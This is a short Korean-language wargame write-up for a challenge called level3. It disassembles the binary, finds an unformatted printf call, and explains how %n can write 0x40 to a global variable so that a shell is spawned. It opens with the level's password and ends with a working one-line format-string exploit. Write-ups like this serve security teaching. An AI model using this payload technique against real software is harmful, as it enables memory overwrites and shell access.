> Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

objdump를 사용해서 level3의 어셈블리 코드를 확인한다.

main 함수는 단순히 v함수를 호출한다.

v함수에서는 fgets로 표준 입력에서 입력을 받고, 그 결과를 printf를 이용해서 출력한 뒤 전역 변수 0x804988c위치의 값이 0x40인지 확인한 다음, 0x40일 때 쉘이 실행된다.

이번에는 저번 문제들과 다르게 입력을 fgets라는 안전한 함수를 이용해서 단순히 ebp + 4를 덮어씌우는 방식의 해킹은 힘들어 보인다.

하지만 printf 함수를 호출하는 부분에 집중해보면

```
 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484d2:	89 04 24             	mov    %eax,(%esp)
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
```

printf("%s", pointer)와 같은 식이 아니라 printf(pointer)와 같은 식으로 호출하는 것을 볼 수 있다.

따라서 우리의 입력이 단순 문자열이 아니라 포맷 스트링으로 취급된다.

정리해보면 이번 문제는 printf를 잘 이용해서 0x804988c위치에 0x40이라는 값을 넣으면 된다.

printf의 %n 서식 지정자를 이용하면 원하는 위치에 현재까지 출력된 글자의 개수를 쓸 수 있다는 점을 이용하여 원하는 위치에 원하는 값을 넣을 수 있다,

```bash
cat <(python -c 'print "\x8c\x98\x04\x08%020p%020p%020p%n",') - | ./level3
```